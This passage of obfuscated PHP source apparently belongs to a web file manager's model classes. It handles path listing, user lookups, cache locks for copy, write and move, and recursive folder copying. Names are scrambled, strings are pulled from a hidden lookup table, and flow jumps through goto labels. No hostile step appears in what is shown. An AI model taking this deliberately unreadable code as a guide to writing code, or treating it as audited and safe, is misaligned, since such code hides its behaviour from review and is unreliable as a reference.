$a¬ĞÅ–à— =& $_SERVER[òÀöí]; if (intval($B¥ôöŒ ª“[$a¬ĞÅ–à—[389]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($aõ §óØç„, $bœâºœ¡Ä‚) && $B¥ôöŒ ª“[$a¬ĞÅ–à—[387]] != $aõ §óØç„) { return; } goto FÔ”â”šš‹; A„êŞç»ôÎ: } protected function _listAppendPathRoot(&$f†×ÛËœó¨, $e˜’âÛÅÙŞ) { $a¹÷­ÓÕ–Ã =& $_SERVER[òÀöí]; $Bï­ØœÖ™µ = $a¹÷­ÓÕ–Ã[33]; if ($f†×ÛËœó¨[$a¹÷­ÓÕ–Ã[389]] == self::TYPE_USER) { if (defined($a¹÷­ÓÕ–Ã[443]) && $f†×ÛËœó¨[$a¹÷­ÓÕ–Ã[474]] == USER_ID) { $Bï­ØœÖ™µ = LNG($a¹÷­ÓÕ–Ã[491]); if (!$e˜’âÛÅÙŞ) { $f†×ÛËœó¨[$a¹÷­ÓÕ–Ã[28]] = $Bï­ØœÖ™µ; } } else { $dÀÏæâÖöñ = Model($a¹÷­ÓÕ–Ã[492])->getInfoSimple($f†×ÛËœó¨[$a¹÷­ÓÕ–Ã[474]]); $Bï­ØœÖ™µ = LNG($a¹÷­ÓÕ–Ã[493]) . $a¹÷­ÓÕ–Ã[159] . $dÀÏæâÖöñ[$a¹÷­ÓÕ–Ã[28]] . $a¹÷­ÓÕ–Ã[494]; } } else { if ($f†×ÛËœó¨[$a¹÷­ÓÕ–Ã[389]] == self::TYPE_GROUP) { $dÀÏæâÖöñ = Model($a¹÷­ÓÕ–Ã[476])->getInfoSimple($f†×ÛËœó¨[$a¹÷­ÓÕ–Ã[474]]); $Bï­ØœÖ™µ = $dÀÏæâÖöñ[$a¹÷­ÓÕ–Ã[28]]; } else { if ($f†×ÛËœó¨[$a¹÷­ÓÕ–Ã[389]] == self::TYPE_SYSTEM) { $dÀÏæâÖöñ = $this->sourceInfo($e˜’âÛÅÙŞ[0], !0); $Bï­ØœÖ™µ = $dÀÏæâÖöñ[$a¹÷­ÓÕ–Ã[28]]; } } } $Bï­ØœÖ™µ = $Bï­ØœÖ™µ ? $a¹÷­ÓÕ–Ã[8] . $Bï­ØœÖ™µ . $a¹÷­ÓÕ–Ã[8] : $a¹÷­ÓÕ–Ã[8]; return $Bï­ØœÖ™µ; } protected function _listAppendUser(&$DÚ©†ï‹”—) { goto bÅ‰œÒÈ; BïÏŞ’£È„: unset($Cµ«ÀŞÙ³); goto DŞ‘ßƒƒ‹´; e¿ñìÆ†ç: $EƒÉÚê˜„Ù = array_merge($fİŠĞËÄ¥‰, $eÓë”·âÏÌ); $D×»ßóĞõ = Model($d‰œÄÆ®Ô…[495])->userListInfo($EƒÉÚê˜„Ù); foreach ($DÚ©†ï‹”— as &$Cµ«ÀŞÙ³) { $a´Ê£ÀÛÅ… = $Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[396]]; $Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[396]] = $D×»ßóĞõ[$a´Ê£ÀÛÅ…] ? $D×»ßóĞõ[$a´Ê£ÀÛÅ…] : !1; $a´Ê£ÀÛÅ… = $Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[397]]; $Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[397]] = $D×»ßóĞõ[$a´Ê£ÀÛÅ…] ? $D×»ßóĞõ[$a´Ê£ÀÛÅ…] : !1; if (isset($Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[434]]) && $Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[434]][$d‰œÄÆ®Ô…[496]]) { $Bé­æÁ±ø = $GLOBALS[$d‰œÄÆ®Ô…[6]][$d‰œÄÆ®Ô…[87]][$d‰œÄÆ®Ô…[497]]; if ($Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[434]][$d‰œÄÆ®Ô…[498]] <= time() - $Bé­æÁ±ø) { $this->metaSet($Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[387]], $d‰œÄÆ®Ô…[496], null); $this->metaSet($Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[387]], $d‰œÄÆ®Ô…[498], null); unset($Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[434]][$d‰œÄÆ®Ô…[496]]); continue; } $cØ¸ºìÀÚ¤ = $Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[434]][$d‰œÄÆ®Ô…[496]]; $Cµ«ÀŞÙ³[$d‰œÄÆ®Ô…[434]][$d‰œÄÆ®Ô…[499]] = Model($d‰œÄÆ®Ô…[495])->getInfoSimpleOuter($cØ¸ºìÀÚ¤); } } goto BïÏŞ’£È„; bÅ‰œÒÈ: $d‰œÄÆ®Ô… =& $_SERVER[òÀöí]; $fİŠĞËÄ¥‰ = array_to_keyvalue($DÚ©†ï‹”—, $d‰œÄÆ®Ô…[33], $d‰œÄÆ®Ô…[396]); $eÓë”·âÏÌ = array_to_keyvalue($DÚ©†ï‹”—, $d‰œÄÆ®Ô…[33], $d‰œÄÆ®Ô…[397]); goto e¿ñìÆ†ç; DŞ‘ßƒƒ‹´: } public function parentLevelArray($E†ÜÙŠ¤Î–) { $côğåÀÆòà =& $_SERVER[òÀöí]; $E†ÜÙŠ¤Î– = explode($côğåÀÆòà[47], trim($E†ÜÙŠ¤Î–, $côğåÀÆòà[47])); return array_remove_value($E†ÜÙŠ¤Î–, $côğåÀÆòà[486]); } public function listAll($F¶¼µ°‡) { goto bÓëã±š; Cà´ğğ¯éˆ: $Aå˜ëÜ¸é‡ = $Båî’†Ì•[504]; $a¡¢ …¯™— = "\x4c\x45\106\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\137\146\151\x6c\x65\x20\x66\151\154\145\40\x6f\x6e\40\163\157\x75\162\143\145\x2e\146\151\154\x65\111\104\x20\75\40\x66\151\x6c\x65\56\146\151\x6c\145\111\x44"; $E„½¬œòÈ— = $this->alias($Båî’†Ì•[505])->field($Aå˜ëÜ¸é‡)->where($d¬ç‘¨Ëá‘)->join($a¡¢ …¯™—)->select(); goto bèóšÑ³Ñ; bÓëã±š: $Båî’†Ì• =& $_SERVER[òÀöí]; $aô™Êğ»« = $this->sourceInfo($F¶¼µ°‡); $d¬ç‘¨Ëá‘ = array($Båî’†Ì•[500] => array($Båî’†Ì•[501], $aô™Êğ»«[$Båî’†Ì•[477]] . $F¶¼µ°‡ . $Båî’†Ì•[502]), $Båî’†Ì•[503] => 0); goto Cà´ğğ¯éˆ; D×š’ã·êÛ: $DŠĞÀ¢œ = array(); foreach ($E„½¬œòÈ— as $A½¾Ì¦É => $cô’æœÊË·) { goto dø¯ªğ¿Ÿ‰; dø¯ªğ¿Ÿ‰: $C›ƒ£½´‡§ = $this->parentLevelArray($cô’æœÊË·[$Båî’†Ì•[477]]); array_shift($C›ƒ£½´‡§); $a¹Šµê² = $f›¢‡‰³¤ï; goto dÓ°Èò; dÓ°Èò: for ($cä·³ğ¯ªê = 0; $cä·³ğ¯ªê < count($C›ƒ£½´‡§); $cä·³ğ¯ªê++) { $a¹Šµê² .= $E„½¬œòÈ—[$C›ƒ£½´‡§[$cä·³ğ¯ªê]][$Båî’†Ì•[28]] . $Båî’†Ì•[8]; } $a¹Šµê² .= $cô’æœÊË·[$Båî’†Ì•[28]]; if ($cô’æœÊË·[$Båî’†Ì•[388]]) { $a¹Šµê² .= $Båî’†Ì•[8]; } goto aÖ‚î©÷ê; cïóÒî‚ŞÍ: if (!$cô’æœÊË·[$Båî’†Ì•[388]]) { $e×ó¢ÒëÜ­[$Båî’†Ì•[436]] = $cô’æœÊË·[$Båî’†Ì•[436]]; $e×ó¢ÒëÜ­[$Båî’†Ì•[85]] = $cô’æœÊË·[$Båî’†Ì•[75]]; } $DŠĞÀ¢œ[] = $e×ó¢ÒëÜ­; goto cä—Ÿæò¹¯; aÖ‚î©÷ê: $a¹Šµê² = str_replace($Båî’†Ì•[485], $Båî’†Ì•[8], $a¹Šµê²); $a¹Šµê² = str_replace($Båî’†Ì•[485], $Båî’†Ì•[8], $a¹Šµê²); $e×ó¢ÒëÜ­ = array($Båî’†Ì•[405] => str_replace($Båî’†Ì•[485], $Båî’†Ì•[8], $a¹Šµê²), $Båî’†Ì•[506] => intval($cô’æœÊË·[$Båî’†Ì•[388]]), $Båî’†Ì•[84] => $this->pathInfoFilter($cô’æœÊË·, !0)); goto cïóÒî‚ŞÍ; cä—Ÿæò¹¯: } return $DŠĞÀ¢œ; goto F¤¿ğõä·¨; bèóšÑ³Ñ: $this->_listAppendAuth($E„½¬œòÈ—); $this->_listAppendUser($E„½¬œòÈ—); $this->_listAppendPath($E„½¬œòÈ—); goto A¨øš¬®; A¨øš¬®: $E„½¬œòÈ— = array_to_keyvalue($E„½¬œòÈ—, $Båî’†Ì•[387]); $f›¢‡‰³¤ï = "\57{$aô™Êğ»«[$Båî’†Ì•[28]]}\x2f"; $f›¢‡‰³¤ï = $f›¢‡‰³¤ï == $Båî’†Ì•[485] ? $Båî’†Ì•[8] : $f›¢‡‰³¤ï; goto D×š’ã·êÛ; F¤¿ğõä·¨: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($e±ñâÜ) { goto bğŒøß‚×; Cù²’µ¼: $this->_lockEvent($e±ñâÜ, array($FÎ°ÑˆÑ±ô[510], $FÎ°ÑˆÑ±ô[511]), $dÑœ´¥³ô¾); $this->_lockCheckEnd($FÎ°ÑˆÑ±ô[507], $e±ñâÜ); goto cÚ“¦¬ñ´; d©³°äÀÈ™: $dÑœ´¥³ô¾ = 1; $this->_lockEvent($e±ñâÜ, array($FÎ°ÑˆÑ±ô[508], $FÎ°ÑˆÑ±ô[509]), $dÑœ´¥³ô¾); $this->_lockParent($e±ñâÜ, array($FÎ°ÑˆÑ±ô[509]), $dÑœ´¥³ô¾); goto Cù²’µ¼; bğŒøß‚×: $FÎ°ÑˆÑ±ô =& $_SERVER[òÀöí]; if (!$this->allowLock()) { return; } $this->_lockCheck($FÎ°ÑˆÑ±ô[507], $e±ñâÜ); goto d©³°äÀÈ™; cÚ“¦¬ñ´: } public function lockCopyEnd($eºİÁ¹ì‹·) { $f§©¨±ãÂš =& $_SERVER[òÀöí]; if (!$this->allowLock()) { return; } $A˜¤¢‹°ä¨ = 0; $this->_lockEvent($eºİÁ¹ì‹·, array($f§©¨±ãÂš[508], $f§©¨±ãÂš[509]), $A˜¤¢‹°ä¨); $this->_lockParent($eºİÁ¹ì‹·, array($f§©¨±ãÂš[509]), $A˜¤¢‹°ä¨); $this->_lockEvent($eºİÁ¹ì‹·, array($f§©¨±ãÂš[510], $f§©¨±ãÂš[511]), $A˜¤¢‹°ä¨); } public function lockWriteStart($Aš°²¾‡‚, $A”¤–Úôí­ = '') { goto a‡îìƒ…‘Ñ; a‡îìƒ…‘Ñ: $FĞæ³¯¸§ =& $_SERVER[òÀöí]; if (!$this->allowLock()) { return; } $this->_lockCheck($FĞæ³¯¸§[508], $Aš°²¾‡‚); goto cËê¢èöÙ; cËê¢èöÙ: $Dƒ¢Ñ˜Ö”› = 1; $this->_lockKey($FĞæ³¯¸§[512] . $Aš°²¾‡‚ . $FĞæ³¯¸§[94] . $A”¤–Úôí­, $Dƒ¢Ñ˜Ö”›); $this->_lockEvent($Aš°²¾‡‚, array($FĞæ³¯¸§[507], $FĞæ³¯¸§[509]), $Dƒ¢Ñ˜Ö”›); goto FØè×ìµÄ; FØè×ìµÄ: $this->_lockParent($Aš°²¾‡‚, array($FĞæ³¯¸§[507], $FĞæ³¯¸§[509]), $Dƒ¢Ñ˜Ö”›); $this->_lockCheckEnd($FĞæ³¯¸§[508], $Aš°²¾‡‚); goto cæ¶è‰ø½ì; cæ¶è‰ø½ì: } public function lockWriteEnd($AªùŠƒ¸, $CÉÓàØñÍõ = '') { $D³¯ô¬‚ï” =& $_SERVER[òÀöí]; if (!$this->allowLock()) { return; } $c²ÉŸ•œíĞ = 0; $this->_lockKey($D³¯ô¬‚ï”[512] . $AªùŠƒ¸ . $D³¯ô¬‚ï”[94] . $CÉÓàØñÍõ, $c²ÉŸ•œíĞ); $this->_lockEvent($AªùŠƒ¸, array($D³¯ô¬‚ï”[507], $D³¯ô¬‚ï”[509]), $c²ÉŸ•œíĞ); $this->_lockParent($AªùŠƒ¸, array($D³¯ô¬‚ï”[507], $D³¯ô¬‚ï”[509]), $c²ÉŸ•œíĞ); } public function lockMoveStart($f‰×æè´¼Ï) { goto cÌ ¬’èœ; A¬ª¦¯˜çà: $cîøÙöšº = 1; $this->_lockKey($B¨À£…Äªå[513] . $f‰×æè´¼Ï, $cîøÙöšº); $this->_lockEvent($f‰×æè´¼Ï, array($B¨À£…Äªå[507], $B¨À£…Äªå[508]), $cîøÙöšº); goto cÂÎÊ¹™˜µ; cÌ ¬’èœ: $B¨À£…Äªå =& $_SERVER[òÀöí]; if (!$this->allowLock()) { return; } $this->_lockCheck($B¨À£…Äªå[509], $f‰×æè´¼Ï); goto A¬ª¦¯˜çà; cÂÎÊ¹™˜µ: $this->_lockParent($f‰×æè´¼Ï, array($B¨À£…Äªå[507], $B¨À£…Äªå[509]), $cîøÙöšº); $this->_lockEvent($f‰×æè´¼Ï, array($B¨À£…Äªå[514], $B¨À£…Äªå[510], $B¨À£…Äªå[511]), $cîøÙöšº); $this->_lockCheckEnd($B¨À£…Äªå[509], $f‰×æè´¼Ï); goto b¿áÙ»º»; b¿áÙ»º»: } public function lockMoveEnd($c³ªŸ˜•¸) { goto dæ„»ø¯Š©; dæ„»ø¯Š©: $Càİ÷ˆºõ‰ =& $_SERVER[òÀöí]; if (!$this->allowLock()) { return; } $f¤†”‰…ˆ× = 0; goto B÷œ¨…Ï‹¿; B÷œ¨…Ï‹¿: $this->_lockKey($Càİ÷ˆºõ‰[513] . $c³ªŸ˜•¸, $f¤†”‰…ˆ×); $this->_lockEvent($c³ªŸ˜•¸, array($Càİ÷ˆºõ‰[507], $Càİ÷ˆºõ‰[508]), $f¤†”‰…ˆ×); $this->_lockParent($c³ªŸ˜•¸, array($Càİ÷ˆºõ‰[507], $Càİ÷ˆºõ‰[509]), $f¤†”‰…ˆ×); goto B¬‰²¹ƒÚ¡; B¬‰²¹ƒÚ¡: $this->_lockEvent($c³ªŸ˜•¸, array($Càİ÷ˆºõ‰[514], $Càİ÷ˆºõ‰[510], $Càİ÷ˆºõ‰[511]), $f¤†”‰…ˆ×); goto böÅ´­¤åŒ; böÅ´­¤åŒ: } private function _lockCheck($F‘ï»â, $aá°…µêÁ¨) { goto A¸¢ø‹­›Ö; D†‰¯…É¸Ñ: $this->_lockTimeStart[$Eç¦†ôƒã³] = timeFloat(); if (!is_array($EÛŞÛ›¿´)) { return; } $c«ƒé‘£ïË = LNG($A¤£“µÅÖ¼[515]); goto bôéÈÒ×”í; bÆ±÷¼³Í¼: $fƒµˆê‚ = array_reverse($this->parentLevelArray($EÛŞÛ›¿´[$A¤£“µÅÖ¼[477]])); foreach ($fƒµˆê‚ as $dãÉã¤‹Æ·) { $Eç¦†ôƒã³ = $F‘ï»â . $A¤£“µÅÖ¼[516] . $dãÉã¤‹Æ·; if (CacheLock::lockGet($A¤£“µÅÖ¼[517] . $Eç¦†ôƒã³)) { $EÛŞÛ›¿´ = $this->sourceInfo($dãÉã¤‹Æ·); CacheLock::setErrorMsg($A¤£“µÅÖ¼[159] . htmlspecialchars($EÛŞÛ›¿´[$A¤£“µÅÖ¼[28]]) . $A¤£“µÅÖ¼[494] . $c«ƒé‘£ïË); $this->_lockKey($Eç¦†ôƒã³, 1); $this->_lockKey($Eç¦†ôƒã³, 0); } } goto c´÷ò‰ÄŒ÷; bôéÈÒ×”í: CacheLock::setErrorMsg($A¤£“µÅÖ¼[159] . htmlspecialchars($EÛŞÛ›¿´[$A¤£“µÅÖ¼[28]]) . $A¤£“µÅÖ¼[494] . $c«ƒé‘£ïË); $this->_lockKey($Eç¦†ôƒã³, 1); $this->_lockKey($Eç¦†ôƒã³, 0); goto bÆ±÷¼³Í¼; A¸¢ø‹­›Ö: $A¤£“µÅÖ¼ =& $_SERVER[òÀöí]; $EÛŞÛ›¿´ = $this->sourceInfo($aá°…µêÁ¨); $Eç¦†ôƒã³ = $F‘ï»â . $A¤£“µÅÖ¼[94] . $aá°…µêÁ¨; goto D†‰¯…É¸Ñ; c´÷ò‰ÄŒ÷: } private function _lockCheckEnd($dæ“‰×Ìçö, $D½»¥»‡¨) { goto DÛÀ†‘œÈ; E¶¤Šñã“: if ($eÓï¸¢âÏ > 0.5) { unset(self::$cacheSourceInfo[$eíŸ½¸ää¯[427] . $D½»¥»‡¨]); } $dƒ¬øÑÛÌí = $this->sourceInfo($D½»¥»‡¨); if (!$dƒ¬øÑÛÌí) { show_json(LNG($eíŸ½¸ää¯[104]), !1); } goto béª»ÕÏ…; aŠ µÑ¢ì: if (!isset($this->_lockTimeStart[$f¬Ôô£¢¹÷])) { return; } $eÓï¸¢âÏ = timeFloat() - $this->_lockTimeStart[$f¬Ôô£¢¹÷]; unset($this->_lockTimeStart[$f¬Ôô£¢¹÷]); goto E¶¤Šñã“; DÛÀ†‘œÈ: $eíŸ½¸ää¯ =& $_SERVER[òÀöí]; $f¬Ôô£¢¹÷ = $dæ“‰×Ìçö . $eíŸ½¸ää¯[94] . $D½»¥»‡¨; CacheLock::setErrorMsg($eíŸ½¸ää¯[370]); goto aŠ µÑ¢ì; béª»ÕÏ…: } private function _lockParent($d„™Ê†¦Š…, $CŞß¾æ§×ß, $D£ì†¾–¨É) { if (!$this->autoLockSet) { return; } $DÙå¶ˆÚ£š = $this->sourceInfo($d„™Ê†¦Š…); if (!is_array($DÙå¶ˆÚ£š)) { return; } $fñêôº´â = array_reverse($this->parentLevelArray($DÙå¶ˆÚ£š[$_SERVER[òÀöí][477]])); foreach ($fñêôº´â as $a§²µÓ„œ•) { $this->_lockEvent($a§²µÓ„œ•, $CŞß¾æ§×ß, $D£ì†¾–¨É); } } private function _lockEvent($d±åËèÃÕ‹, $CùƒÍĞë¯º, $cÂŠŒÖ†¦…) { $eì¼‰é¦’“ =& $_SERVER[òÀöí]; if (!$this->autoLockSet) { return; } foreach ($CùƒÍĞë¯º as $bôâÛ±”ÚÔ) { $bÉ­‹”œ¤ = $bôâÛ±”ÚÔ . $eì¼‰é¦’“[94] . $d±åËèÃÕ‹; if ($cÂŠŒÖ†¦… && CacheLock::lockGet($eì¼‰é¦’“[517] . $bÉ­‹”œ¤)) { continue; } $this->_lockKey($bÉ­‹”œ¤, $cÂŠŒÖ†¦…); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($a¬»­ÓÇ‹š, $A’“óĞ² = 1) { $aãœ°§Á¹ = $_SERVER[òÀöí][517] . md5($a¬»­ÓÇ‹š); if ($A’“óĞ²) { if (isset(self::$_lockItemArr[$aãœ°§Á¹])) { return; } self::$_lockItemArr[$aãœ°§Á¹] = 1; CacheLock::lock($aãœ°§Á¹, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$aãœ°§Á¹])) { return; } unset(self::$_lockItemArr[$aãœ°§Á¹]); CacheLock::unlock($aãœ°§Á¹); } } public function isParentOf($E‰‚Éˆá«, $e‡Ô×ÑŒ) { goto f÷†¹ïá®„; f¯ƒÌ»¯±: $C…¼±Î æ· = $F‡ŠŠÎçÂÖ[$eÕïö¢‚ëÇ[477]] . $F‡ŠŠÎçÂÖ[$eÕïö¢‚ëÇ[387]] . $eÕïö¢‚ëÇ[47]; $Eä­‚Ÿ•¬ = $dÓó¨±çËË[$eÕïö¢‚ëÇ[477]] . $dÓó¨±çËË[$eÕïö¢‚ëÇ[387]] . $eÕïö¢‚ëÇ[47]; $dÏ¥©Ä¦Î² = strpos($Eä­‚Ÿ•¬, $C…¼±Î æ·) === 0; goto Dëİì”ÑÒì; Dëİì”ÑÒì: return $dÏ¥©Ä¦Î²; goto bÏ¯¦…Şé; f÷†¹ïá®„: $eÕïö¢‚ëÇ =& $_SERVER[òÀöí]; $F‡ŠŠÎçÂÖ = $this->sourceInfo($E‰‚Éˆá«); $dÓó¨±çËË = $this->sourceInfo($e‡Ô×ÑŒ); goto f¯ƒÌ»¯±; bÏ¯¦…Şé: } private $targetIsDelete = 0; public function copy($fÒ£ß‹ÈØÛ, $d‡ª¢Û‚”·, $EÎİœ¨Ğè„ = REPEAT_REPLACE, $dÊ¶®»£° = '') { goto b÷˜“ÙåË“; D™†¡‘Àò: if ($AŠÅÎÇÎ±«[$aÛÁÑŒøØÌ[388]] == $aÛÁÑŒøØÌ[86] && $d»ùØ²¦Şæ == $f†œ¯«ØÍ’) { $this->folderSizeResetChildren($d»ùØ²¦Şæ); } Model($aÛÁÑŒøØÌ[521])->addAll($Eãµ¨¬ƒàå[$aÛÁÑŒøØÌ[519]], array(), !0); if ($d»ùØ²¦Şæ != $f†œ¯«ØÍ’ || $AŠÅÎÇÎ±«[$aÛÁÑŒøØÌ[388]] == $aÛÁÑŒøØÌ[86]) { Model($aÛÁÑŒøØÌ[522])->eventCopy($f†œ¯«ØÍ’); } goto dÖîˆ½»Ø¥; b÷˜“ÙåË“: $aÛÁÑŒøØÌ =& $_SERVER[òÀöí]; $AŠÅÎÇÎ±« = $this->sourceInfo($fÒ£ß‹ÈØÛ); $D‹†Ïİ‡Ï’ = $this->sourceInfo($d‡ª¢Û‚”·); goto cÀ°±¾Ö‘; f»¢ó®¶Î‡: $this->_childrenListClear(); $this->lockCopyEnd($fÒ£ß‹ÈØÛ); $this->lockWriteEnd($d‡ª¢Û‚”·, $f ½‚†Ÿ…); goto D™†¡‘Àò; dÖîˆ½»Ø¥: $this->saveAll($Eãµ¨¬ƒàå[$aÛÁÑŒøØÌ[520]]); Model($aÛÁÑŒøØÌ[173])->linkAdd($Eãµ¨¬ƒàå[$aÛÁÑŒøØÌ[518]]); $this->folderSizeReset($d‡ª¢Û‚”·); goto bË¤È”ËåÇ; e‡ŠœùÎ‡„: $this->lockCopyStart($fÒ£ß‹ÈØÛ); $this->lockWriteStart($d‡ª¢Û‚”·, $f ½‚†Ÿ…); $Eãµ¨¬ƒàå = array($aÛÁÑŒøØÌ[518] => array(), $aÛÁÑŒøØÌ[519] => array(), $aÛÁÑŒøØÌ[520] => array()); goto CÅÌÖ¬Ç…‘; cÀ°±¾Ö‘: if (!$AŠÅÎÇÎ±« || !$D‹†Ïİ‡Ï’ || $D‹†Ïİ‡Ï’[$aÛÁÑŒøØÌ[388]] != $aÛÁÑŒøØÌ[86]) { return !1; } if ($this->isParentOf($fÒ£ß‹ÈØÛ, $d‡ª¢Û‚”·)) { return !1; } $f ½‚†Ÿ… = $dÊ¶®»£° ? $dÊ¶®»£° : $AŠÅÎÇÎ±«[$aÛÁÑŒøØÌ[28]]; goto e‡ŠœùÎ‡„; CÅÌÖ¬Ç…‘: $this->targetIsDelete = intval($AŠÅÎÇÎ±«[$aÛÁÑŒøØÌ[414]]); $d»ùØ²¦Şæ = $this->fileNameExistCache($d‡ª¢Û‚”·, $AŠÅÎÇÎ±«[$aÛÁÑŒøØÌ[28]]); $f†œ¯«ØÍ’ = $this->_copy($fÒ£ß‹ÈØÛ, $d‡ª¢Û‚”·, $EÎİœ¨Ğè„, $Eãµ¨¬ƒàå, !0, $dÊ¶®»£°); goto f»¢ó®¶Î‡; bË¤È”ËåÇ: $this->updateModifyTime($d‡ª¢Û‚”·); return $f†œ¯«ØÍ’; goto bù‹â³ÃÄ; bù‹â³ÃÄ: } private function _copy($D¯ÑÇ†ñ¶ö, $F™Ë¦ë«ÈÅ, $BòÌ³»’é, &$e¹Ç´¥‘, $dø°ç¿¼µÛ, $A¹ê˜öŠÀ = '') { goto EÃ”¨¸‘Ñ; bŒó…ïŸ‚Á: if (!$cŞ¿…¾ÉÙì) { return $this->_copyCreate($D¯ÑÇ†ñ¶ö, $F™Ë¦ë«ÈÅ, $bÖÁó¦µ, $e¹Ç´¥‘); } $bßíÙ…ˆŠÔ = $cŞ¿…¾ÉÙì; if ($CÙò…İ¡¤ö) { if ($BòÌ³»’é == REPEAT_RENAME_FOLDER) { $bÖÁó¦µ = $this->fileNameAutoCache($F™Ë¦ë«ÈÅ, $bÖÁó¦µ, $BòÌ³»’é, $CÙò…İ¡¤ö); $bßíÙ…ˆŠÔ = $this->_copyCreate($D¯ÑÇ†ñ¶ö, $F™Ë¦ë«ÈÅ, $bÖÁó¦µ, $e¹Ç´¥‘); } else { $A…Ï·º‚‹” = $this->_childrenList($D¯ÑÇ†ñ¶ö); foreach ($A…Ï·º‚‹” as $EŠÒ³Ì¤Òä) { $this->_copy($EŠÒ³Ì¤Òä[$EÚ„àä¹Í[387]], $cŞ¿…¾ÉÙì, $BòÌ³»’é, $e¹Ç´¥‘, !1); } } } else { if ($BòÌ³»’é == REPEAT_RENAME || $BòÌ³»’é == REPEAT_RENAME_FOLDER) { $bÖÁó¦µ = $this->fileNameAutoCache($F™Ë¦ë«ÈÅ, $bÖÁó¦µ, $BòÌ³»’é, $CÙò…İ¡¤ö); $bßíÙ…ˆŠÔ = $this->_copyCreate($D¯ÑÇ†ñ¶ö, $F™Ë¦ë«ÈÅ, $bÖÁó¦µ, $e¹Ç´¥‘); } else { if ($BòÌ³»’é == REPEAT_REPLACE) { $b¬­ÃÈØ¸‘ = $this->sourceInfoCache($cŞ¿…¾ÉÙì); $fÜíù†âä’ = $this->fileHistory($b¬­ÃÈØ¸‘, $BÖà¡»ëë[$EÚ„àä¹Í[436]], $BÖà¡»ëë[$EÚ„àä¹Í[77]]); if ($fÜíù†âä’) { $e¹Ç´¥‘[$EÚ„àä¹Í[518]][] = $BÖà¡»ëë[$EÚ„àä¹Í[436]]; } } else { if ($BòÌ³»’é == REPEAT_SKIP) { } } } Hook::trigger($EÚ„àä¹Í[523], array($EÚ„àä¹Í[524], $BÖà¡»ëë, 0)); } goto E—¾šŞø; EÃ”¨¸‘Ñ: $EÚ„àä¹Í =& $_SERVER[òÀöí]; $BÖà¡»ëë = $this->sourceInfoCache($D¯ÑÇ†ñ¶ö); $CÙò…İ¡¤ö = $BÖà¡»ëë[$EÚ„àä¹Í[388]] == $EÚ„àä¹Í[86]; goto BŞ§³„¡À‡; E—¾šŞø: return $bßíÙ…ˆŠÔ; goto dÔƒí¬¯¤›; BŞ§³„¡À‡: $bÖÁó¦µ = $A¹ê˜öŠÀ ? $A¹ê˜öŠÀ : $BÖà¡»ëë[$EÚ„àä¹Í[28]]; $cŞ¿…¾ÉÙì = $this->fileNameExistCache($F™Ë¦ë«ÈÅ, $bÖÁó¦µ); if ($dø°ç¿¼µÛ) { $this->_childrenAllMake($D¯ÑÇ†ñ¶ö); if ($CÙò…İ¡¤ö && $cŞ¿…¾ÉÙì) { $this->_childrenAllMake($cŞ¿…¾ÉÙì); } } goto bŒó…ïŸ‚Á; dÔƒí¬¯¤›: } private function _copyCreate($EÛªø ×åŠ, $e–äÔš»Ü§, $BŒ¼¦†±‚î, &$C‹Ì›éÇÀœ) { goto BÃº¼Ë•; A˜²¤ëÇ³: foreach ($BùŞµÌ‡“¾ as $Eáä”Ë¯ô¯) { $Fã÷ïİ¹æ± = $Eáä”Ë¯ô¯[$AñïæåÙ¹[387]]; $eê°Äñ±ÆÍ = $this->_childrenMatch($e°…ä…Ì…š, $Eáä”Ë¯ô¯, $dòÁ–ñ…”Å); $dïÎ–‡Ù„[] = array($AñïæåÙ¹[387], $Fã÷ïİ¹æ±, $AñïæåÙ¹[479], $eê°Äñ±ÆÍ[$AñïæåÙ¹[479]]); $cˆˆÇ«é¿[] = array($AñïæåÙ¹[387], $Fã÷ïİ¹æ±, $AñïæåÙ¹[477], $eê°Äñ±ÆÍ[$AñïæåÙ¹[477]]); $this->_copyApplyMeta($Eáä”Ë¯ô¯, $C‹Ì›éÇÀœ); if ($Eáä”Ë¯ô¯[$AñïæåÙ¹[388]] != $AñïæåÙ¹[86]) { $C‹Ì›éÇÀœ[$AñïæåÙ¹[518]][] = $Eáä”Ë¯ô¯[$AñïæåÙ¹[436]]; } } $this->chunkEventSet($AñïæåÙ¹[530], array($AñïæåÙ¹[531], $côŞäŒË¼, $EÜºåŸ£åà)); $this->saveAll($dïÎ–‡Ù„); goto f«Ö‰Òàà; Fø‰¾Ïì: if ($AĞ±­Á‚¤Ö[$AñïæåÙ¹[388]] != $AñïæåÙ¹[86]) { $C‹Ì›éÇÀœ[$AñïæåÙ¹[518]][] = $AĞ±­Á‚¤Ö[$AñïæåÙ¹[436]]; return $BèŸ¡Ì…Œ¶; } $D‘°ÛÊ†º§ = array(); $B¸œğÄ¶† = array(); goto CÔ‹â¨’½ã; aà¥…Šìø‰: $e°…ä…Ì…š[$EÛªø ×åŠ] = $BèŸ¡Ì…Œ¶; $dïÎ–‡Ù„ = array(); $cˆˆÇ«é¿ = array(); goto A˜²¤ëÇ³; CÔ‹â¨’½ã: $this->_childrenListAll($EÛªø ×åŠ, $D‘°ÛÊ†º§); $EÜºåŸ£åà = count($D‘°ÛÊ†º§); if ($EÜºåŸ£åà == 0) { return $BèŸ¡Ì…Œ¶; } goto e…²©ÑÃÓÎ; c²õ½ë˜à: $BèŸ¡Ì…Œ¶ = $this->add($côŞäŒË¼); $fÂÅÌ…¨ = array($AñïæåÙ¹[387] => $BèŸ¡Ì…Œ¶, $AñïæåÙ¹[28] => $BŒ¼¦†±‚î); $this->_copyApplyMeta($fÂÅÌ…¨, $C‹Ì›éÇÀœ); goto Fø‰¾Ïì; f«Ö‰Òàà: $this->chunkEventSet($AñïæåÙ¹[532], array($AñïæåÙ¹[533], $côŞäŒË¼, $EÜºåŸ£åà)); 